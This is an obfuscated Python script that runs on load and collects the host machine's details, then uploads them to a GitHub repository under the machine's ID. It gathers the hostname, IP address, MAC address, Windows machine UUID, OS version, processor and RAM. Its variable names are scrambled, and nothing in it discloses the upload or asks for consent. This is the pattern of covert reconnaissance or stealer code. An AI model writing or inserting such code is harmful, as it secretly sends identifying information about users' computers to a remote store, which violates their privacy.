import platform ,socket ,re ,uuid ,psutil ,json ,subprocess #line:1
from Github import Github #line:2
class System :#line:5
    def to_github ():#line:6
        OOO000O0OO000OOO0 =Github ()#line:7
        OOO000O0OO000OOO0 .save_to_repo ("SysInfo/"+System .get_machine_id ()+".data",System .sys_info ().encode ("utf-8"))#line:11
        print ("Sysinfo done")#line:12
    def get_machine_id ():#line:14
        return (subprocess .check_output ("wmic csproduct get uuid").decode ().split ("\n")[1 ].strip ())#line:20
    def sys_info ():#line:22
        try :#line:23
            OOO000OO0O0000OOO ={}#line:24
            OOO000OO0O0000OOO ["platform"]=platform .system ()#line:25
            OOO000OO0O0000OOO ["platform-release"]=platform .release ()#line:26
            OOO000OO0O0000OOO ["platform-version"]=platform .version ()#line:27
            OOO000OO0O0000OOO ["architecture"]=platform .machine ()#line:28
            OOO000OO0O0000OOO ["hostname"]=socket .gethostname ()#line:29
            OOO000OO0O0000OOO ["ip-address"]=socket .gethostbyname (socket .gethostname ())#line:30
            OOO000OO0O0000OOO ["mac-address"]=":".join (re .findall ("..","%012x"%uuid .getnode ()))#line:31
            OOO000OO0O0000OOO ["processor"]=platform .processor ()#line:32
            OOO000OO0O0000OOO ["ram"]=(str (round (psutil .virtual_memory ().total /(1024.0 **3 )))+" GB")#line:35
            return json .dumps (OOO000OO0O0000OOO )#line:36
        except Exception as OO00OO0OOOOOO00OO :#line:37
            print (OO00OO0OOOOOO00OO )#line:38
System .to_github ()#line:41
